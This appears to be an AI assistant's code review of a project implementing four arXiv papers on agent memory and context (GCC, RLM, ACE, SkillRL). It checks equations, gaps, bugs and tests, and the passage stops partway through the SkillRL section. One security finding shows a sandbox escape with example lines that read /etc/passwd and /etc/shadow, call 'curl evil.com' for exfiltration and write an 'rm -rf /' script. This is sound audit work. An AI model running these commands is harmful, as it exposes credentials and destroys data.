The complete review was already produced in my previous response. Here it is again in full, unabridged, with every section filled out per the requested format.

---

## GCC (arXiv:2508.00031) — Score: 7/10

### What They Claim vs What They Built

The GCC paper specifies COMMIT/BRANCH/MERGE/CONTEXT operations with metadata.yaml, OTA logging, rolling summaries, and context windowing. **All of these are implemented.** The `.ccr/` directory structure mirrors the open-gcc TypeScript reference implementation faithfully:

- `branches/main/commits.md` -- milestone journal with structured commit records
- `branches/main/log.md` -- OTA triple log
- `branches/<name>/summary.md` -- per-branch summary with purpose/hypothesis/conclusion
- `branches/_registry.md` -- branch registry with active branch tracking
- `main.md` -- project overview with current focus, milestones, open branches
- `metadata.yaml` -- file trees, dependencies, config, version counter

Commits produce structured records `M_t = (I_t, S_t, D_t)` matching the paper's specification. Each commit contains: title, what, why, files_changed, next_step, timestamp, branch, and an OTA trace reference. Branches create isolated directories with their own commits.md, log.md, and summary.md. Merges integrate the branch's rolling summary into main (per the paper's `F_merge` function), copy the branch's execution log with provenance headers (per `H_{t+1} = H_t union H_t^(b)`), update the branch conclusion, create a merge commit on main, and switch back to main. Context retrieval supports 5 levels with windowing via offset parameter, matching the paper's scrollable K-window.

A-MAC admission control (arXiv:2603.04549) is claimed with Algorithm 1 three-way (admit/merge/reject). This is implemented with significant but well-documented adaptations for the no-LLM constraint.

### Equation Verification

**S(m) = 0.60 * N(m) + 0.40 * T(m)** -- Verified at `memory.py:649`:
```python
admission_score = 0.60 * novelty + 0.40 * tp
```
Weights match the documented claim (w_N=0.60, w_T=0.40). The paper's full equation is S(m) = w_N*N + w_R*R + w_U*U + w_C*C + w_T*T with 5 factors. CCR uses 3 of 5 (N, R, T), folding R into the similarity computation rather than the score directly. The rationale is documented: for a new commit being created NOW, R(m)=1.0 always, so R only makes sense as a modulator on existing commits' conflict strength. This is a defensible reinterpretation.

**N(m) = 1 - max_{m' in M} sim(phi(m), phi(m'))** (Eq. 3, Novelty) -- Verified at `memory.py:644`:
```python
novelty = 1.0 - best_similarity
```
Correct polarity: high similarity to existing commits means low novelty. The max is taken over all k recent commits (line 565: `k=5` default, configurable). The loop at lines 604-642 iterates over `recent` and tracks `best_similarity`. Correct implementation of Eq. 3.

**R(m) = exp(-lambda * tau(m)), lambda=0.01/hour** (Eq. 4, Recency) -- Verified at `memory.py:617`:
```python
conflict_recency = math.exp(-0.01 * hours_since)
```
Lambda=0.01 matches. Half-life is ln(2)/0.01 = 69.3 hours (~2.9 days). The `_hours_since_commit` method (line 675) parses commit timestamps and returns elapsed hours. Missing timestamps return 999.0 (treated as very old, producing R near 0). Correct.

**Similarity computation** (proxy for SBERT cosine, line 613):
```python
raw_sim = 0.50 * file_sim + 0.50 * keyword_sim
```
Where `file_sim = Jaccard(new_files, old_files)` and `keyword_sim = Jaccard(new_words, old_words)`. Stop words are filtered (line 592). Words must be >2 characters. This is a proxy for Sentence-BERT cosine similarity using word Jaccard. The paper uses SBERT embeddings; this substitution is acknowledged and reasonable given the no-LLM constraint, though it has substantially lower discriminative power for semantically similar but lexically different commits.

**Recency-modulated FindConflict** (line 620):
```python
effective_sim = raw_sim * conflict_recency
```
This correctly dampens old conflicts: a commit from 3 days ago (R=0.50) has its similarity halved compared to one just made (R=1.0). This matches the paper's intent of recency-modulated conflict detection per section 3.3.

**FindConflict threshold** (line 308):
```python
if score["similarity"] >= admission_threshold and score["conflict_id"]:
```
Default `admission_threshold=0.85` matches the paper's section 3.3 specification.

**S(m_conflict) computation** (lines 641-642):
```python
assumed_novelty = 0.7 * conflict_recency  # decays with age
best_conflict_score = 0.60 * assumed_novelty + 0.40 * conflict_tp
```
This is a **fabrication**. The paper's Algorithm 1 line 6 compares S(m) vs S(m_conflict) where S(m_conflict) was the score computed when the conflicting commit was originally admitted. The code cannot retroactively compute the original novelty of the stored commit, so it assumes N=0.7 (a "reasonable prior for commits that passed admission") and decays it by recency. The conflict commit's type is correctly re-classified (line 636-639). This is a defensible heuristic but is a departure from Algorithm 1's specification and should be explicitly flagged as such rather than claimed as an implementation of the algorithm.

**Algorithm 1 three-way decision** (lines 289-335):
- Line 296: `if score["score"] < rejection_threshold` -- Rejection (Alg. 1 line 11). Correct polarity: low score = low value = reject.
- Line 308: `if score["similarity"] >= admission_threshold and score["conflict_id"]` -- FindConflict found (Alg. 1 line 4).
- Line 315: `if new_score > conflict_score: pass` -- New outranks existing, fall through to create new (Alg. 1 line 6/9: both coexist).
- Line 318-334: `else: _merge_into_last_commit(...)` -- Existing outranks new, merge (Alg. 1 line 7).
- Line 337+: No conflict, create new commit (Alg. 1 line 9).

All branches of Algorithm 1 are present. The decision flow is correct.

### Missing/Omitted Components

1. **U(m) -- Utility factor**: Requires LLM to rate future usefulness of a memory. Omitted. Weight redistributed to N and T. Documented at lines 530-531.
2. **C(m) -- Confidence factor**: Requires ROUGE-L computation against source turns. Omitted. Documented at lines 530-531.
3. **Stored admission scores**: The paper implies S(m) should be stored with each memory entry for later comparison in Algorithm 1 line 6. The code does NOT store S(m) at commit time. This forces the "assumed novelty = 0.7" hack for S(m_conflict). This is the single biggest algorithmic gap -- it means Algorithm 1 line 6 never uses the real S(m_conflict).
4. **LLM-regenerated rolling summaries**: The code supports this (lines 818-833) via `sub_client.completion()`, but in MCP mode `sub_client` is never set (`MemoryManager` is initialized without one at `mcp_server.py:58`). So summaries are always concatenation-based with a 1500-char cap. The GCC paper considers LLM summarization a core feature of the progressive refinement chain S_t = f(S_{t-1}, D_t).
5. **Auto-CONTEXT before every MERGE**: Implemented (line 877: `_pre_merge_context = self.get_context(level=3, branch=branch_name)`), but the result is captured into a local variable and never used. It's computed but discarded. The paper says CONTEXT should inform the merge decision.
6. **Multi-project context**: GCC describes managing context across multiple projects. CCR manages one project per MemoryManager instance.

### Implementation Bugs Found

1. **Metadata version double-increment on merge**: `_update_metadata_branch` (line 1299) and `_update_metadata_branch_status` (line 1308) both increment `meta["version"]`. During branch creation, only `_update_metadata_branch` is called (fine). But during merge, `_update_metadata_branch_status` is called (line 920), and if any other metadata update happens in the same merge flow, version increments twice. Minor but indicates imprecise version tracking.

2. **`_merge_into_last_commit` regex fragility** (line 731): The title-append regex uses `rf"\g<1>\2 + {title}"` where `{title}` is interpolated directly into the regex replacement string. If the title contains backslash sequences (e.g., `\n`, `\1`), they will be interpreted as regex backreferences. This is a latent injection bug. Should use a function-based replacement or `re.escape()` on the title.

3. **OTA ID overflow after 999 entries** (line 1077-1081): The ID format is `OTA-{latest + 1:03d}` which produces 3-digit zero-padded IDs. The regex `\[OTA-(\d{3})\]` only matches exactly 3 digits. After OTA-999, the next ID becomes OTA-1000 (4 digits), which won't match the regex on the next call. `_get_next_ota_id` will return OTA-001, creating a duplicate. The fix is trivial: change `\d{3}` to `\d+` and the format to `f"OTA-{latest + 1:03d}"` (which already handles >999 correctly for the formatting side).

4. **No timezone awareness**: `datetime.now()` is used throughout without tzinfo. Commits created before and after a DST transition, or on a machine that changes timezones (e.g., laptop traveling), will have incorrect recency calculations. A commit made at 2:30 AM before "spring forward" and one at 3:30 AM after it are 0 real hours apart but `_hours_since_commit` will compute ~1 hour.

5. **`_git_commit` uses `--allow-empty`** (line 1433): This means git commits are created even when there are no actual file changes in .ccr/. This clutters the git history with empty commits.

6. **`_read_commits_window` doesn't validate offset** (line 1361-1369): If offset > number of commits, the slice returns an empty list silently. This is arguably correct behavior but there's no indication to the caller that the window is out of bounds.

### Test Coverage Assessment

**Strong.** 46+ admission control tests across `test_memory.py` (classes: `TestComputeAdmissionScore`, `TestMaxSimilarityAcrossK`, `TestTypePrior`, `TestRecency`, `TestScoreComparisonInMerge`, `TestRejectionPath`, `TestAdmissionControlIntegration`) plus 28+ GCC paper gap tests in `test_gcc_paper_gaps.py` (classes: `TestLLMRollingSummary`, `TestConcatenationFallback`, `TestContextLogWindow`, `TestContextMetadataSegment`, `TestOTASliceInCommits`, `TestFMergeIntegration`, `TestExecutionTraceUnion`, `TestGitCommitIntegration`, `TestCurrentFocusUpdate`, `TestReadLogWindow`, `TestGetOTASliceSinceLastCommit`) plus 14+ core GCC tests in `test_memory_gcc.py` (classes: `TestMetadataYaml`, `TestSummaryMd`, `TestOTATriples`, `TestContextWindowing`, `TestRollingSummary`, `TestAutoContextBeforeMerge`).

Specific tests that verify paper claims:
- `test_first_commit_max_score`: Verifies N=1.0 when no existing commits (Eq. 3 boundary)
- `test_correct_polarity_higher_score_is_better`: Verifies higher S(m) = more valuable (correct polarity)
- `test_merge_type_always_admitted`: Verifies structural bypass (T=1.0, score=1.0)
- `test_recency_modulates_similarity`: Verifies R near 1.0 for recent commits (Eq. 4)
- `test_new_outranks_existing_creates_new`: Verifies Alg. 1 line 6 branch
- `test_existing_outranks_new_merges`: Verifies Alg. 1 line 7 branch
- `test_reject_low_score_commit`: Verifies Alg. 1 line 11 rejection path
- `test_rejection_does_not_create_commit`: Verifies rejected commits are not stored
- `test_default_threshold_0_85`: Verifies paper's section 3.3 default
- `test_merged_commit_updates_what/unions_files/updates_next`: Verifies merge semantics
- `test_merge_integrates_branch_summary_into_main`: Verifies F_merge
- `test_merge_copies_branch_log_to_main`: Verifies H_{t+1} = H_t union H_t^(b)

These tests genuinely verify Algorithm 1 branches and paper equations. This is not cosmetic testing.

---

## RLM (arXiv:2512.24601) — Score: 5/10

### What They Claim vs What They Built

The RLM paper describes a recursive execution model with these core components:
1. An LLM writes Python code in response to a task
2. Code executes in a sandboxed REPL
3. Stdout is captured as metadata-only observations (types, lengths, structure -- not raw dumps)
4. The prompt/context is loaded as a REPL variable (not injected into the LLM context window)
5. FINAL_VAR terminates the loop and returns the named variable
6. Recursive sub-calls (rlm_query) spawn child orchestrators at depth+1
7. A compaction mechanism summarizes execution history when context grows large
8. The LLM drives the iteration loop autonomously

In MCP mode, **the core iteration loop is NOT implemented.** The three MCP tools (`rlm_init`, `rlm_execute`, `rlm_finalize`) expose a bare REPL. Claude Code must manually decide what code to execute, observe the output, decide what to execute next, and call `rlm_finalize` when done. This is functionally equivalent to having a REPL, but it is NOT the RLM architecture. The RLM architecture's key insight is that the model autonomously drives a code-observe-code loop within a single API call, maintaining state across iterations without consuming context window tokens.

The legacy `CCRRlm` orchestrator in `ccr/rlm/orchestrator.py` does implement the full iteration loop with LLM-driven code generation, compaction, depth-limited recursion, budget tracking, and error threshold termination. But this orchestrator is **explicitly marked as "not used in MCP mode"** and requires a sub-model client that doesn't exist in the Claude Max subscription architecture.

### Equation Verification

RLM doesn't have numbered equations. The key algorithmic claims:

- **Prompt as REPL variable**: Implemented. `mcp_server.py:581`: `_repl.locals["task_prompt"] = task_prompt`. The task prompt is available as a Python variable inside the REPL, not injected into the LLM's context window. This matches the paper's Section 3.1. Correct.

- **Context as REPL variable**: Implemented. `repl.py:155-161`: `self.locals["context"] = self.repo_index.to_context_dict()`. The repo index metadata is loaded as a dict variable. Content is fetched on-demand via `get_file()` to avoid loading everything. This matches the paper's disk-based context approach. Correct.

- **Metadata-only stdout**: Partially implemented. `mcp_server.py:623-626`:
  ```python
  if len(stdout) > 500:
      parts.append(f"stdout ({len(stdout)} chars): {stdout[:500]}...")
  else:
      parts.append(f"stdout: {stdout}")
  ```
  This is a hard truncation at 500 chars, not the RLM paper's metadata-only approach. The paper specifies that stdout should report structure (e.g., "dict with 3 keys: 'name', 'age', 'items'; 'items' is a list of 42 elements") rather than dumping raw content. The implementation just cuts at 500 characters. This loses the structural insight that makes metadata-only observations useful.

- **FINAL_VAR termination**: Implemented. `repl.py:180-200` implements `_final_var` which sets `_last_final_answer`. `mcp_server.py:660` calls it via `rlm_finalize`. The variable is serialized as JSON for dicts/lists, str otherwise. Correct.

- **Recursive sub-calls**: `rlm_query` is injected into the REPL namespace (`repl.py:147`) but `subcall_fn` is never wired in MCP mode (`mcp_server.py:580`: `CCRRepl(repo_index=idx)` -- no `subcall_fn` parameter). Calling `rlm_query()` in the REPL falls back to `_llm_query()` which requires `sub_client` which is also None. So `rlm_query("anything")` returns `"Error: No sub-model client configured"`. Dead feature in MCP mode.

- **SHOW_VARS**: Implemented (`repl.py:202-211`). Not in the paper but a useful debugging addition.

- **Execution timeout**: Implemented with SIGALRM on Unix + thread fallback (`repl.py:377-409`). Default 30 seconds. Correct.

- **Large context disk-based storage**: Implemented (`repl.py:364-375`). Payloads >100KB are written to a temp file and the path is exposed. Matches the paper's recommendation for large contexts.

### Missing/Omitted Components

1. **The entire LLM-driven iteration loop**: This is the defining feature of RLM. The model generates code, observes output, generates more code, until FINAL_VAR. In MCP mode, Claude Code does this manually via sequential `rlm_execute` tool calls. Each call to `rlm_execute` is a separate MCP tool invocation that goes through Claude Code's own context window. This defeats the core purpose of RLM (keeping execution state out of the LLM's context window -- the code variables persist in the REPL but the observation/reasoning stays in Claude Code's context).

2. **Compaction**: The legacy orchestrator has compaction history (`_compaction_history` attribute, tested in `test_rlm_paper_gaps.py:243-271`). MCP mode has none. As the Claude Code conversation grows, there's no mechanism to summarize past REPL interactions.

3. **Depth-limited recursion**: `RLMConfig.max_depth=2` exists but is never used in MCP mode. The legacy orchestrator checks depth on sub-calls.

4. **Budget/timeout tracking across iterations**: `RLMConfig` has `max_budget_usd`, `max_total_tokens`, `max_timeout_seconds`, `max_consecutive_errors`. None are used in MCP mode. Each `rlm_execute` call has its own 30-second timeout, but there's no session-level budget.

5. **Structured observation format**: The paper describes returning observations like `"list[dict] with 15 entries, keys: ['id', 'name', 'score']"`. The implementation just truncates stdout at 500 chars.

6. **History/trajectory tracking**: The legacy orchestrator tracks `trajectory` (list of code/observation pairs). MCP mode doesn't.

### Implementation Bugs Found

1. **CRITICAL SECURITY: REPL sandbox is trivially escapable.** The `_BLOCKED_MODULES` frozenset at `repl.py:29-31` blocks `subprocess`, `shutil`, `signal`, `ctypes`, `multiprocessing`, `pty`, `fcntl`, `termios`, `resource`. But `os` is NOT blocked. This means:
   ```python
   import os
   os.system("cat /etc/passwd")        # arbitrary command execution
   os.popen("curl evil.com").read()    # network exfiltration
   os.listdir("/")                     # filesystem enumeration
   os.remove("/important/file")        # file deletion
   ```
   Furthermore, `open` is directly exposed in `_SAFE_BUILTINS` (`repl.py:63`): `"open": open`. So even without `import os`, the REPL can read/write any file:
   ```python
   open("/etc/shadow").read()           # read sensitive files
   open("/tmp/evil.sh", "w").write("#!/bin/bash\nrm -rf /")  # write malicious scripts
   ```
   Additional escapable modules NOT in `_BLOCKED_MODULES`: `socket` (network access), `http` (HTTP requests), `urllib` (URL fetching), `pathlib` (filesystem traversal), `glob` (filesystem enumeration), `importlib` (dynamic import to bypass checks), `sys` (interpreter manipulation). **The sandbox provides a false sense of security.**

2. **Thread-based timeout doesn't actually kill the thread** (`repl.py:393-409`): The fallback timeout (used when not on the main thread or not on Unix) starts a daemon thread, joins with timeout, and raises `TimeoutError` if the thread is still alive. But the thread continues running in the background -- it's never killed. A malicious tight loop (`while True: pass`) will consume CPU indefinitely. Only SIGALRM (Unix, main thread) can actually interrupt tight loops.

3. **`_capture_output` is not thread-safe** (`repl.py:266-276`): `sys.stdout` and `sys.stderr` are global. If two REPL instances run concurrently (or if the main application writes to stdout during REPL execution), output will be interleaved or lost. The `_exec_lock` prevents concurrent execution within a single REPL instance, but not across instances or with the rest of the application.

4. **`execute_code` merges globals and locals into `combined`** (`repl.py:318`): `combined = {**self.globals, **self.locals}`. After execution, new variables are extracted by checking `if key not in self.globals` (line 323). But if user code creates a variable with the same name as a global (e.g., `FINAL_VAR = "overwritten"`), the check fails -- the key IS in self.globals, so the overwrite isn't captured. The `_restore_scaffold` (line 326) partially addresses this by restoring reserved names, but non-reserved globals that get overwritten are silently lost.

### Test Coverage Assessment

**Weak for MCP mode, moderate for the legacy orchestrator.**

REPL tests (`test_repl.py`, 23 tests): Basic execution, variable persistence, FINAL_VAR (string, dict, direct value, not found), SHOW_VARS (empty, with data), error handling, safe builtins block input, imports work, locals snapshot, context loading (dict, accessible), custom tools, reserved names not overwritten, mock client (llm_query, no client, rlm_query fallback, subcall), scaffold restoration (overwrite llm_query/FINAL_VAR), context manager cleanup, execution time tracking.

RLM paper gap tests (`test_rlm_paper_gaps.py`, 26 tests): exec blocked, batched queries (list return, empty), thread lock (exists, concurrent safe), custom tool tuples (callable, value, plain callable, reserved ignored), large context (small no temp, large temp file, large dict), typed exceptions (base, budget, timeout, error threshold, partial answers), token limit, compaction history (variable, attribute), system prompt examples.

**What's missing:**
- No test verifying `os` module is blocked (because it isn't -- this would be a failing test)
- No test for `socket`, `http`, `urllib`, `pathlib`, `glob` module access
- No test for `open` reading arbitrary filesystem paths
- No test for metadata-only stdout truncation behavior in MCP mode
- No integration test of the full `rlm_init` -> `rlm_execute` -> `rlm_finalize` flow through the MCP server
- No test for concurrent REPL instances (stdout interleaving)
- No test for daemon thread zombie behavior after timeout
- The `test_safe_builtins_block_input` test (test_repl.py:64) only checks `input` is blocked, not `exec`, `eval`, or `compile` directly in the REPL (though `exec` blocking is tested in test_rlm_paper_gaps.py:27)

---

## ACE (arXiv:2510.04618) — Score: 8/10

### What They Claim vs What They Built

The ACE paper describes a three-agent system for agentic context engineering:
1. **Curator**: Proposes delta operations (ADD/UPDATE/MERGE/REMOVE) to the playbook based on task outcomes
2. **Reflector**: Reviews bullet effectiveness and tags bullets as helpful/harmful
3. **Deduplicator**: Finds near-duplicate bullets and proposes MERGE operations

The playbook is a structured document with sections and bullets, where each bullet has an ID and helpful/harmful counters. The playbook evolves through grow-and-refine cycles: grow (ADD new bullets) and refine (UPDATE/MERGE/REMOVE to compress).

CCR implements the **data structure and operations** faithfully but replaces the three agents with direct Claude Code tool calls. This is an explicit architectural decision: rather than having a weak sub-model play Curator/Reflector/Deduplicator, Claude Code itself (a much more capable model) performs these roles via `ace_apply_delta`, `ace_update_counters`, and `ace_find_similar`.

### Equation Verification

ACE doesn't use numbered equations. The key formal claims:

**Structured bullets with ID and counters**: Implemented. `playbook.py:112-145`:
```python
@dataclass
class Bullet:
    id: str
    content: str
    section: str
    helpful: int = 0
    harmful: int = 0
```
With `score` property (line 147): `return self.helpful - self.harmful`. Matches the paper's specification.

**Six default sections** (per ACE Figure 3): Implemented at `playbook.py:23-30`:
```python
DEFAULT_SECTIONS = [
    "STRATEGIES & INSIGHTS",
    "CODE SNIPPETS & TEMPLATES",
    "COMMON MISTAKES TO AVOID",
    "PROBLEM-SOLVING HEURISTICS",
    "CONTEXT CLUES & INDICATORS",
    "OTHERS",
]
```
Matches the paper.

**Delta operations (ADD/UPDATE/MERGE/REMOVE)**: All four implemented.
- ADD (`playbook.py:396-423`): Generates auto-incrementing ID, assigns to section, appends to bullets list. Sets `last_updated` timestamp.
- UPDATE (`playbook.py:424-440`): Finds bullet by ID, replaces content, optionally changes section.
- MERGE (`playbook.py:442-494`): Finds two bullets, combines content into target, sums counters, unions failure lessons, preserves scope/when_to_apply from either bullet, removes the absorbed bullet.
- REMOVE (`playbook.py:496-514`): Finds and removes bullet by ID.

Operation ordering (`playbook.py:371-390`): ADDs first, then UPDATEs, then MERGEs, then REMOVEs. This is correct -- you can't UPDATE a bullet that hasn't been ADDed yet, and you shouldn't REMOVE a bullet before MERGEing it.

**Bullet format** (`playbook.py:160-170`):
```
[slug-00001] helpful=5 harmful=0 :: Strategy content here
```
Matches the ACE paper's specified format with ID, counters, and content separator.

**Playbook serialization/parsing roundtrip**: `serialize()` (line 295) and `__init__` parser (line 181) maintain roundtrip fidelity. Tested extensively.

**Similarity for deduplication** (`playbook.py:531-544`):
```python
combined = 0.4 * word_jaccard + 0.6 * tri_jaccard
```
Uses word Jaccard (40% weight) + character trigram Jaccard (60% weight). The paper doesn't specify a particular similarity metric for deduplication; this is a reasonable choice. Character trigrams catch morphological similarity (e.g., "implement" vs "implementation") that word Jaccard misses.

**Grow-and-refine pruning**:
- `prune_problematic` (`playbook.py:551-569`): Removes bullets where `harmful >= helpful and harmful >= min_harmful`. The `min_harmful` threshold (default 3) prevents premature pruning of bullets with only 1-2 harmful tags. Correct.
- `enforce_token_budget` (`playbook.py:571-590`): Iteratively removes the bullet with the lowest `effective_score` until the serialized playbook is under `max_chars`. Now uses temporal decay for scoring. Correct semantics.

### Missing/Omitted Components

1. **Curator agent**: The paper describes an automated Curator that proposes deltas based on task outcomes. In CCR, Claude Code manually calls `ace_apply_delta`. This means delta quality depends entirely on the host model's judgment -- there's no specialized curation logic. However, since Claude Code is likely more capable than any sub-model that would serve as Curator, this may produce better results in practice.

2. **Reflector agent**: The paper has a Reflector that evaluates each bullet's effectiveness in context. In CCR, Claude Code manually calls `ace_update_counters`. Same trade-off as above.

3. **Automated deduplication scheduling**: The paper runs deduplication every N steps (`refinement_frequency`). `ACEConfig.refinement_frequency = 10` exists (`types.py:225`) but is **never used** -- there's no code that counts steps and auto-triggers `find_similar_pairs`. Claude Code must manually call `ace_find_similar` and then `ace_apply_delta` with MERGE operations.

4. **Token budget enforcement on mutation**: `enforce_token_budget` is only called inside `ace_prune` (`mcp_server.py:512`). It is NOT called automatically on ADD operations. This means a playbook can grow unbounded between explicit prune calls. The paper implies the playbook should stay within budget at all times.

5. **Grow-and-refine scheduling**: The paper describes alternating grow phases (accumulate new bullets) and refine phases (deduplicate, prune). CCR has no notion of phases -- all operations are available at all times. This is pragmatically fine but loses the paper's intentional cadence.

### Implementation Bugs Found

1. **`enforce_token_budget` is O(n^2)** (`playbook.py:571-590`): The while loop calls `self.serialize()` on every iteration to check the character count. `serialize()` iterates all bullets. Then `min(self._bullets, key=lambda b: b.effective_score())` iterates all bullets again. For a playbook with n bullets where k must be pruned, this is O(k * n) -- quadratic if k scales with n. For a playbook at the 80K char limit with hundreds of bullets, this could be noticeably slow. A single sort + slice would be O(n log n).

2. **ID collision after MERGE/REMOVE**: When a bullet is removed (via MERGE target absorption or REMOVE), its ID is freed but `_next_id` counter never decreases (`playbook.py:334`: `_next_id` only increments on ADD). This is correct behavior (IDs should never be reused). But if someone manually edits `playbook.txt` and inserts a bullet with an ID number >= `_next_id`, the parser sets `_next_id` to `max(existing) + 1` (line 250-255), which prevents collision. However, if the manual edit uses a non-standard ID format, the regex at line 244 (`re.match(r"([a-z]{3})-(\d{5})", bullet_id)`) won't match, and `_next_id` won't be updated. Edge case.

3. **`parse_delta_operations` accepts raw dicts** (`playbook.py:344-388`): The function takes a dict with an "operations" key, each operation being a dict. There's no validation that required fields exist before accessing them. Line 356: `DeltaOperation(type="ADD", section=op.get("section", "OTHERS"), content=op["content"])` -- if "content" is missing, this raises KeyError with no helpful error message. Should use `.get()` with validation.

4. **`find_similar_pairs` is O(n^2)** (`playbook.py:516-548`): Compares every bullet pair. For a playbook with 200 bullets, that's ~20,000 comparisons, each computing word Jaccard + trigram Jaccard. Acceptable for small playbooks but won't scale.

### Test Coverage Assessment

**Excellent.** 120+ tests in `test_playbook.py` organized into well-named test classes:

Core functionality:
- `TestBullet` (5 tests): score, problematic, not problematic, unused, format_line
- `TestPlaybookParsing` (6 tests): sample, sections, content, next_id, empty, none
- `TestPlaybookSerialization` (3 tests): roundtrip, sections, bullets
- `TestPlaybookOperations` (5 tests): get_bullet, not found, section bullets, extract, not found
- `TestBulletCounts` (5 tests): helpful, harmful, neutral, multiple, nonexistent
- `TestDeltaOperations` (6 tests): add, correct ID, unknown section, multiple, increment, preserve existing
- `TestParseDeltaOperations` (4 tests): valid, empty, unknown ops, missing operations
- `TestPruning` (4 tests): problematic, keeps good, threshold, token budget
- `TestPlaybookStats` (4 tests): total, high performing, problematic, by section
- `TestCreateEmptyPlaybook` (4 tests): has sections, no bullets, serializes, custom sections

SkillRL integration (covered in SkillRL section below).

MCP integration (`test_mcp_server.py`):
- `TestACEGetPlaybook` (2 tests), `TestACEApplyDelta` (5 tests + persistence), `TestACEUpdateCounters` (2 tests), `TestACEUpdateCountersWithFailureLessons` (5 tests), `TestACEGetStats` (2 tests), `TestACEFindSimilar` (2 tests), `TestACEPrune` (2 tests), `TestACEEvolveFromFailures` (4 tests)

Workflow tests:
- `TestWorkflows.test_ace_full_cycle`: Tests ADD -> UPDATE -> counter updates -> prune flow

The tests verify actual paper claims (delta operation semantics, pruning thresholds, serialization fidelity, counter behavior). This is the strongest test suite in the project.

---

## SkillRL (arXiv:2602.08234) — Score: 6/10

### What They Claim vs What They Built

The SkillRL paper describes experience-based skill distillation where:
1. A teacher model M_T analyzes failed trajectories tau^- to produce failure skills s^-
2. Success trajectories tau^+ also produce success skills s^+
3. Skills have structure: {ID, Skill Title, Principle, When to Apply} (Table 5)
4. Skills are hierarchically scoped: S_g (general) and S_k (task-specific)
5. Evolution is triggered when accuracy for a category drops below a threshold delta (Eq. 1)
6. The teacher synthesizes across multiple failures to find patterns

CCR implements the **failure lesson data structure** and a **mechanical evolution pipeline**, but lacks the teacher model and cross-failure synthesis that are the paper's core contributions.

### Equation Verification

**Eq. 2: s^+ = M_T(tau^+, d)** (success skill distillation): **NOT implemented.** CCR only handles failure skills. There is no mechanism to distill successful trajectories into skills. When a bullet is tagged as "helpful", the counter increments but no skill is extracted from the success.

**Eq. 3: s^- = M_T(tau^-, d)** (failure skill distillation): **Partially implemented.** The paper says a teacher model M_T analyzes the full failed trajectory tau^- and the task description d to produce a failure skill s^-. In CCR, there is no teacher model. Instead, Claude Code manually provides a structured failure lesson when tagging a bullet as harmful (`mcp_server.py:406-410`):
```python
"failure_lesson": {
    "failure_point": "Where the strategy broke down",
    "flawed_reasoning": "What incorrect assumption was made",
    "counterfactual": "What should have been done instead",
    "prevention_principle": "General rule to avoid this failure"
}
```
This captures the output format of M_T but not the process. The quality of failure analysis depends entirely on Claude Code's self-reflection ability, not on a specialized teacher model analyzing the full trajectory.

**Eq. 1: Acc(C) < delta triggers evolution**: **NOT implemented as specified.** The paper triggers evolution when accuracy for category C drops below threshold delta. CCR triggers when `count(harmful_bullets_with_lessons) >= threshold` (default 3). This is a count-based trigger, not an accuracy-based trigger. There's no concept of categories or per-category accuracy tracking.

**Table 5 format: {ID, Skill Title, Principle, When to Apply}**: Partially implemented.
- ID: Yes (`Bullet.id`)
- Skill Title: No separate field. `Bullet.content` serves as both title and principle combined.
- Principle: Merged into `Bullet.content`. During evolution (`playbook.py:717`), `content` is set to the `prevention_principle` from the failure lesson.
- When to Apply: Yes (`Bullet.when_to_apply`). Set from the failure lesson's `task_context` during evolution (line 708-712).

**Hierarchical scope S_g (general) vs S_k (task-specific)**: Implemented via `Bullet.scope` field (line 140: `scope: str = "general"`). Evolution always sets `scope="general"` (line 717). There is no mechanism to set `scope="task_specific"` -- it's always "general" for evolved bullets. The two-tier playbook (global/project) provides a different hierarchy axis (cross-project vs single-project) but doesn't map to SkillRL's general/task-specific distinction.

### Missing/Omitted Components

1. **Teacher model M_T**: The entire M_T that analyzes failed trajectories is absent. Evolution is mechanical: it copies `prevention_principle` from the failure lesson into a new bullet's content. The paper's M_T would analyze the full trajectory (all steps, observations, decisions) to produce a synthesized insight. CCR relies on Claude Code's self-reflection to provide the failure lesson, which is equivalent to the operator (not a specialized teacher) doing the analysis.

2. **Success skill distillation (Eq. 2)**: Not implemented. Only failure side exists.

3. **Accuracy-based triggering (Eq. 1)**: Replaced by a simple count threshold. No concept of per-category accuracy tracking. The paper's insight is that evolution should be targeted to categories where the agent is struggling; CCR's count-based trigger is category-agnostic.

4. **Cross-failure synthesis**: SkillRL's M_T analyzes multiple failures together to find patterns across them. CCR's `evolve_from_failures` (`playbook.py:658-730`) processes each failure lesson independently (line 688-726 loops over bullets, extracting individual prevention_principles). It never looks at multiple failures together to synthesize a higher-order insight like "these three failures all stem from not validating input boundaries."

5. **Skill validation**: The paper implies evolved skills should be validated (does the skill actually prevent the failure?). CCR creates evolved bullets with helpful=0, harmful=0 and lets future counter updates determine their value. No validation step.

6. **Skill title as separate field**: Table 5 shows a distinct "Skill Title" column. CCR merges title and principle into `content`.

### Implementation Bugs Found

1. **Failure lessons lost on pruning**: `prune_problematic` (`playbook.py:551-569`) removes bullets where `harmful >= helpful and harmful >= min_harmful`. These are exactly the bullets most likely to have failure lessons (they're harmful!). If pruning happens before `evolve_from_failures` is called, the failure lessons are permanently lost. The method returns the removed bullets (line 569: `return removed`), but nobody saves their lessons. The `ace_prune` MCP tool (`mcp_server.py:510-515`) calls `prune_problematic` then `enforce_token_budget` and saves -- but it never calls `evolve_from_failures` first.

   **Fix**: Either auto-evolve before pruning, or extract and save failure lessons from pruned bullets before removing them.

2. **Dedup against existing bullets uses exact content match** (`playbook.py:686`):
   ```python
   seen_principles = {b.content.strip().lower() for b in self._bullets}
   ```
   Line 700:
   ```python
   if principle_normalized in seen_principles:
       continue  # skip — already exists
   ```
   This is a pure string equality check. If an existing bullet says "Always validate user input before processing" and a prevention_principle says "Validate all user input", the dedup misses it. Semantic dedup (or even fuzzy string matching like the Jaccard+trigram used in `find_similar_pairs`) would be much more effective.

3. **`evolve_from_failures` only processes bullets currently in the playbook** (`playbook.py:688`): `for bullet in list(self._bullets)`. If a bullet was removed (by REMOVE delta or by pruning), its failure lessons are gone. Combined with bug #1, this means the evolution pipeline can miss important failure data.

4. **`evolved` flag on bullets is fragile** (`playbook.py:143`): `evolved: bool = False`. This flag is set to True after a bullet's lessons have been evolved into new skills (line 728). But the flag is only persisted through the companion JSON file (`save_failure_lessons` / `load_failure_lessons`). If the companion JSON is deleted or corrupted while `playbook.txt` survives, the `evolved` flag resets to False, and `evolve_from_failures` will re-evolve the same lessons, creating duplicate skills.

### Test Coverage Assessment

**Good.** 82 SkillRL-specific tests across multiple test classes:

Failure lesson structure:
- `TestFailureLesson` (6 tests): creation, to_dict, from_dict, missing fields, roundtrip, format_text
- `TestBulletWithFailureLessons` (4 tests): default no lessons, with lessons, format_line unchanged, format_line with failures
